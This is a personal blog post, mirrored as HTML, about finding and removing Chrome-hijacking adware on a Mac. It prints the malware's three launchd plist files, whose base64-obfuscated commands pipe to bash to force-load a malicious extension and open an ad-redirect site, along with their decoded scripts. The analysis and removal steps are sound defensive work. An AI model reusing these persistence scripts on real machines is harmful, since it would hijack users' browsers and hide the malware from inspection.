<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://bobbiechen.com/blog/2022/4/3/some-interesting-malware">Original</a>
    <h1>Some interesting malware I found</h1>
    
    <div id="readability-page-1" class="page"><div data-layout-label="Post Body" data-type="item" data-updated-on="1649019930360" id="item-624a0bf9fd82d657d8a9235d"><div><div><div data-block-type="44" id="block-2ba0bd6dca05f9040e7f"><div><p>I recently found some interesting malware on my partner&#39;s computer, a Macbook, and removed it (I think).</p>
<h3 id="observed-behavior">Observed behavior</h3>
<p>When you first opened a new instance of Google Chrome, after a delay of a few seconds, sometimes more, it would close itself and re-open to the same set of tabs.
In this new window, searches from the omnibox would use Bing as the search engine instead of the default Google.</p>
<p>On closer look, the newly opened browser would have a new extension.
It was called &#34;Properties&#34; and looked incredibly generic, trying to masquerade as a part of the browser itself.
Normally, you can disable extensions from the Extensions settings (chrome://extensions).
But this extension would programmatically close chrome://extensions and open chrome://settings in a new tab - so you couldn&#39;t disable it in the normal way.</p>
<p>Besides that, periodically a new browser would open to the malicious site <em>hxxps[://]ationwindon.com/?tid=TID&amp;optid=OPTID&amp;cook=COOK&amp;agec=UNIXTIMESTAMP</em> , which redirected through a bunch of ads to some random website (I wouldn&#39;t try fixing this link to visit it, personally).
I don&#39;t know what TID, OPTID, or COOK were, but agec was a Unix timestamp of a recent time, probably when the malware was installed.</p>
<h3 id="investigation-and-removal">Investigation and removal</h3>
<p>It&#39;s been a very long time since I&#39;ve dealt with malware <sup data-preserve-html-node="true" id="return-1"><a href="#footnote-1">[footnote 1]</a></sup>, so I reached for the tried-and-true <a href="https://www.malwarebytes.com/">Malwarebytes</a>.
I ran a full scan and didn&#39;t find anything!
That really piqued my interest.</p>
<p>I tried launching Chrome with logging, which led to these cryptic loglines when the first instance was killed.</p>
<pre><code>$ /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --enable-logging --v=1
[66691:259:0327/220315.708306:ERROR:command_buffer_proxy_impl.cc(328)] GPU state invalid after WaitForGetOffsetInRange.
[66691:259:0327/220315.726434:ERROR:gpu_process_host.cc(972)] GPU process exited unexpectedly: exit_code=15
[66723:259:0327/220315.878644:ERROR:mach_port_rendezvous.cc(310)] bootstrap_look_up com.google.Chrome.MachPortRendezvousServer.1: Permission denied (1100)
[66723:259:0327/220316.092266:ERROR:child_thread_impl.cc(226)] Mach rendezvous failed, terminating process (parent died?)</code></pre><p>The new instance, of course, was started without logging, so this gave me no insight into what it was doing.</p>
<p>We spent some more time flailing around doing things that did not work, and eventually just reset the Chrome settings entirely, which disables all extensions on restart.
On opening a new window, something still closed the browser and re-opened a new instance, but since extensions were disabled, we could now go to chrome://extensions and take a closer look at the malicious extension.</p>
<p>Looking at the extension details, I could see it was installed locally from <code>/private/var/tmp/95EE66A0-1E4F-43D0-85B6-C721950DE325</code>.
In my excitement, I immediately deleted it (with <code>rm</code>), so... I don&#39;t have any idea what actually went into it.
But after the malicious &#34;Properties&#34; extension was removed, we stopped seeing Bing redirects and were once again able to open chrome://extensions normally.
I tried searching for the filepath <code>/private/var/tmp/95EE66A0-1E4F-43D0-85B6-C721950DE325</code> (using <code>grep</code>), and didn&#39;t find any references to it anywhere.
Victory!
At least, until the ad site opened again.</p>
<p>I was stumped here, until our friend Ishraq suggested it might be something like an <a href="https://support.apple.com/guide/automator/welcome/mac">Automator</a> or <a href="https://support.apple.com/guide/shortcuts-mac/welcome/mac">Shortcuts</a> script.
It turned out to be neither of those things, but investigating them led us to <a href="https://stackoverflow.com/questions/132955/how-do-i-set-a-task-to-run-every-so-often">this StackOverflow question</a> which pointed us to the <a href="https://en.wikipedia.org/wiki/Launchd">launchd</a> directories.
Poking around in <code>~/Library/LaunchAgents</code> turned up <code>plist</code> files that looked related to Google Chrome.</p>
<p><code>com.chrome.extension.plist</code></p>
<pre><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;
&lt;plist version=&#34;1.0&#34;&gt;
&lt;dict&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;StartInterval&lt;/key&gt;
    &lt;integer&gt;31&lt;/integer&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.chrome.extension&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;sh&lt;/string&gt;
        &lt;string&gt;-c&lt;/string&gt;
        &lt;string&gt;echo aWYgcHMgYXggfCBncmVwIC12IGdyZXAgfCBncmVwICdHb29nbGUgQ2hyb21lJyAmPiAvZGV2L251bGw7IHRoZW4gZWNobyBydW5uaW5nOyAgRVhURU5TSU9OX1NFUlZJQ0U9J0dvb2dsZSBDaHJvbWUgLS1sb2FkLWV4dGVuc2lvbic7IGlmIHBzIGF4IHwgZ3JlcCAtdiBncmVwIHwgZ3JlcCAnR29vZ2xlIENocm9tZSAtLWxvYWQtZXh0ZW5zaW9uJyAmPiAvZGV2L251bGw7IHRoZW4gZWNobyBlIHJ1bm5pbmc7IGVsc2UgICBwa2lsbCAtYSAtaSAnR29vZ2xlIENocm9tZSc7IHNsZWVwIDEgOyAgb3BlbiAtYSAnR29vZ2xlIENocm9tZScgLS1hcmdzIC0tbG9hZC1leHRlbnNpb249Jy9wcml2YXRlL3Zhci90bXAvOTVFRTY2QTAtMUU0Ri00M0QwLTg1QjYtQzcyMTk1MERFMzI1JyAtLXJlc3RvcmUtbGFzdC1zZXNzaW9uIC0tbm9lcnJkaWFsb2dzIC0tZGlzYWJsZS1zZXNzaW9uLWNyYXNoZWQtYnViYmxlOyBmaTsgIGVsc2UgZWNobyBub3QgcnVubmluZzsgZmk= | base64 --decode | bash&lt;/string&gt;
    &lt;/array&gt;
&lt;/dict&gt;
&lt;/plist&gt;</code></pre>
<p>That&#39;s an awfully suspicious command here, using <code>sh -c</code> to pipe a base64-encoded string into <code>bash</code>.
As you&#39;ll see, this obfuscation prevented me from finding this file using <code>grep</code>.
Here&#39;s the output of <code>echo aWY... | base64 --decode</code>, with a little more formatting:</p>
<pre><code>if ps ax | grep -v grep | grep &#39;Google Chrome&#39; &amp;&gt; /dev/null;
then
    echo running;
    EXTENSION_SERVICE=&#39;Google Chrome --load-extension&#39;;
    if ps ax | grep -v grep | grep &#39;Google Chrome --load-extension&#39; &amp;&gt; /dev/null;
    then
        echo e running;
    else
        pkill -a -i &#39;Google Chrome&#39;;
        sleep 1 ;
        open -a &#39;Google Chrome&#39; --args  \
            --load-extension=&#39;/private/var/tmp/95EE66A0-1E4F-43D0-85B6-C721950DE325&#39;  \
            --restore-last-session  \
            --noerrdialogs  \
            --disable-session-crashed-bubble;
    fi;
else
    echo not running;
fi</code></pre>
<p>This code explains the behavior we see around Chrome mysteriously closing and reopening.
If Google Chrome is running, this script checks to see if it was started with the <code>--load-extension</code> option; if it wasn&#39;t, then it kills the currently running browser instances (with <code>pkill -a -i</code> <sup data-preserve-html-node="true" id="return-2"><a href="#footnote-2">[footnote 2]</a></sup>) and starts a new one with the malicious extension, with no error dialogs or session crashed prompts.
The SystemAgent runs with a <code>StartInterval</code> of 31 seconds, which explains why there wasn&#39;t a consistent timing between opening Chrome and Chrome being restarted with the malicious extension: it wasn&#39;t triggered by starting Chrome at all, but rather by a periodic check.</p>
<p>The next file, <code>com.chrome.extensions.plist</code> (with the extra &#34;s&#34;), was largely the same, with nothing new in it, so I&#39;ll skip it here.
If you&#39;re interested, see <span data-preserve-html-node="true" id="return-3"><a href="#footnote-3">[footnote 3]</a></span> for the details.</p>
<p>And the third file, <code>com.chrome.extensionsPop.plist</code>, looked like this:</p>
<pre><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;
&lt;plist version=&#34;1.0&#34;&gt;
&lt;dict&gt;
  &lt;key&gt;StartInterval&lt;/key&gt;
  &lt;integer&gt;3600&lt;/integer&gt;
  &lt;key&gt;Label&lt;/key&gt;
  &lt;string&gt;com.chrome.extensionsPop&lt;/string&gt;
  &lt;key&gt;ProgramArguments&lt;/key&gt;
  &lt;array&gt;
    &lt;string&gt;sh&lt;/string&gt;
    &lt;string&gt;-c&lt;/string&gt;
    &lt;string&gt;echo b3BlbiAtbmEgJ0dvb2dsZSBDaHJvbWUnIC0tYXJncyAtbG9hZC1leHRlbnNpb249Jy9wcml2YXRlL3Zhci90bXAvOTVFRTY2QTAtMUU0Ri00M0QwLTg1QjYtQzcyMTk1MERFMzI1JyAtLW5ldy13aW5kb3cgJ2h0dHBzOi8vYXRpb253aW5kb24uY29tLz90aWQ9OTQ5MTE1Jm9wdGlkPTc4NzQzMiZjb29rPTQ4NTA0OTAyMzI3NzE3OTY5MTkmYWdlYz0xNjQ3OTc4NTQwJzs= | base64 --decode | bash&lt;/string&gt;
  &lt;/array&gt;
&lt;/dict&gt;
&lt;/plist&gt;</code></pre>
<p>Decoding the string resulted in this output (with some of the query parameters in the url removed):</p>
<pre><code>open -na &#39;Google Chrome&#39; --args  \
    -load-extension=&#39;/private/var/tmp/95EE66A0-1E4F-43D0-85B6-C721950DE325&#39;  \
    --new-window &#39;https://ationwindon.com/?tid=WWWWWW&amp;optid=XXXXXX&amp;cook=YYYYYYYYYYYYYYYYYYY&amp;agec=ZZZZZZZZZZ&#39;;</code></pre>
<p>This final piece explains the behavior we saw opening the random redirect website, which turns out to run once per hour.
Nice!</p>
<p>Having learned my lesson from deleting the extension source code too soon, I made a copy of the code for later reference, and then deleted all three of the malicious <code>plist</code> files.
I opened a new Chrome instance and re-declared victory... for a few seconds, but not more than 31 seconds, when it closed and re-launched Chrome again.
It was more-or-less a regular Chrome since we had deleted the extension from that filepath already, but it just felt so dirty.</p>
<p>Of course, deleting a file generally just <code>unlink</code>s, which removes its pathname from the filesystem, but does not necessarily delete all existing references to it.
I could still see the <code>com.chrome.extension*.plist</code> jobs in the output of <code>launchctl list</code> even after the associated files had been <code>rm</code>ed.
The last cleanup step was to run <code>launchctl unload</code> with each of those three jobs, which stops the jobs and unloads their configuration.</p>
<p>Finally, we were actually done.
No signs of malware since.</p>
<h3 id="learnings">Learnings</h3>
<p>I learned about a few cool things while getting rid of this malware:</p>
<ul>
<li>Malware targets Macs these days</li>
<li>A Chrome extension can basically deny the &#34;normal&#34; uninstallation route by preventing you from getting to <code>chrome://extensions</code> (and presumably <code>about://addons</code> for Firefox, etc.)</li>
<li><code>launchd</code> exists and can be used in a cron-like way by writing <code>plist</code> XML files</li>
</ul>
<p><sup data-preserve-html-node="true" id="return-4"><a href="#footnote-4">[footnote 4]</a></sup></p>
<p>I took some time to submit the plist files from this post to Malwarebytes in the hopes that it might help some other people who have been infected.
There&#39;s no update from their end yet, but that was just earlier today. <sup data-preserve-html-node="true" id="return-5"><a href="#footnote-5">[footnote 5]</a></sup></p>
<p>And as the last step after removing the malware, I took the opportunity to install <a href="https://en.wikipedia.org/wiki/UBlock_Origin">uBlock Origin</a> on my partner&#39;s computer.
I&#39;m sympathetic to website operators who want to support their free sites using ads, but these ads are often malicious, leading to installers for malware like the one described in this post.
She&#39;s no digital dummy, and still, in a moment of inattention, was able to click on an ad and do the wrong thing;
we were lucky to notice and remove it before it could harvest valuable data like banking credentials <sup data-preserve-html-node="true" id="return-6"><a href="#footnote-6">[footnote 6]</a></sup>.
Going forward, it&#39;s better to remove that attack vector entirely.</p>
<hr/>

<p>[footnote 1] <a data-preserve-html-node="true" id="footnote-1" href="#return-1">(back to content)</a></p>
<p>That&#39;s the perk of running Linux on your personal laptop, no one bothers writing malware to target you.
The flip side is that no one bothers writing drivers either.</p>
<hr/>
<p>[footnote 2] <a data-preserve-html-node="true" id="footnote-2" href="#return-2">(back to content)</a></p>
<p>That this was just <code>pkill -a -i</code> was a little surprising to me -
I briefly speculated that maybe I didn&#39;t get any useful logs from <code>Google\ Chrome.app --enable-logging</code> because the process had been <code>SIGKILL</code>ed, but <code>pkill</code> sends <code>SIGTERM</code> by default, which means that the application had the opportunity to log a message before terminating.
I guess Chrome just doesn&#39;t log that (not that I bothered to check).</p>
<hr/>
<p>[footnote 3] <a data-preserve-html-node="true" id="footnote-3" href="#return-3">(back to content)</a></p>
<p><code>com.chrome.extensions.plist</code></p>
<pre><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; &#34;http://www.apple.com/DTDs/PropertyList-1.0.dtd&#34;&gt;
&lt;plist version=&#34;1.0&#34;&gt;
&lt;dict&gt;
    &lt;key&gt;StartInterval&lt;/key&gt;
    &lt;integer&gt;21600&lt;/integer&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.chrome.extensions&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;sh&lt;/string&gt;
        &lt;string&gt;-c&lt;/string&gt;
        &lt;string&gt;echo cGtpbGwgLWEgLWkgJ0dvb2dsZSBDaHJvbWUnOyBzbGVlcCAxIDsgIG9wZW4gLWEgJ0dvb2dsZSBDaHJvbWUnIC0tYXJncyAtLWxvYWQtZXh0ZW5zaW9uPScvcHJpdmF0ZS92YXIvdG1wLzk1RUU2NkEwLTFFNEYtNDNEMC04NUI2LUM3MjE5NTBERTMyNScgLS1yZXN0b3JlLWxhc3Qtc2Vzc2lvbiAtLW5vZXJyZGlhbG9ncyAtLWRpc2FibGUtc2Vzc2lvbi1jcmFzaGVkLWJ1YmJsZTs= | base64 --decode | bash&lt;/string&gt;
    &lt;/array&gt;
&lt;/dict&gt;
&lt;/plist&gt;</code></pre>
<p>This obfuscated string decodes out to the following:</p>
<pre><code>pkill -a -i &#39;Google Chrome&#39;;
sleep 1 ;
open -a &#39;Google Chrome&#39; --args  \
  --load-extension=&#39;/private/var/tmp/95EE66A0-1E4F-43D0-85B6-C721950DE325&#39;  \
  --restore-last-session  \
  --noerrdialogs  \
  --disable-session-crashed-bubble;</code></pre>
<p>That&#39;s exactly the same as the innermost block from the first plist, but this one runs every 6 hours (21600 seconds) - even if Chrome isn&#39;t running or installed.</p>
<p>Honestly, I&#39;m pretty confused about why this is here.
The first script seems like a more sophisticated version of this, that only runs when it needs to.
So maybe this second script was a draft or proof-of-concept that was never cleaned up... but that doesn&#39;t make sense if it only runs every 6 hours.</p>
<hr/>
<p>[footnote 4] <a data-preserve-html-node="true" id="footnote-4" href="#return-4">(back to content)</a></p>
<p>While following up on some details for this blog post, I came across someone else who had the same issue, and actually <a href="https://stackoverflow.com/questions/71190718/i-installed-a-software-from-chrome-and-i-think-it-was-a-piece-of-malware">posted the installation script on StackOverflow</a>.
I didn&#39;t find this script on my partner&#39;s computer, which makes me slightly nervous.</p>
<p>The script also shows that the string <code>95EE66A0-1E4F-43D0-85B6-C721950DE325</code> is just a random UUID, so it isn&#39;t meaningful on its own, and other victims would not see the same string.</p>
<hr/>
<p>[footnote 5] <a data-preserve-html-node="true" id="footnote-5" href="#return-5">(back to content)</a></p>
<p>That was more annoying that expected, by the way.
You can only submit suspected malware through their forum, so I had to first create an account.
While creating the account, I failed the &#34;security check&#34; twice on questions that I definitely had the correct answer to.
Then the third time, I also had to fill out a reCAPTCHA and click on traffic lights.
Only then did I get the ability to write a quick summary and upload the plist files.
It would be nice if this process were easier to get into.</p>
<hr/>
<p>[footnote 6] <a data-preserve-html-node="true" id="footnote-6" href="#return-6">(back to content)</a></p>
<p>Our friend Adolfo points out that browser extension malware these days will often check for MetaMask or other crypto wallets to instantly drain them.
Luckily, we are also immune to this attack by not owning any cryptocurrency.</p>

</div></div></div></div></div></div>
  </body>
</html>
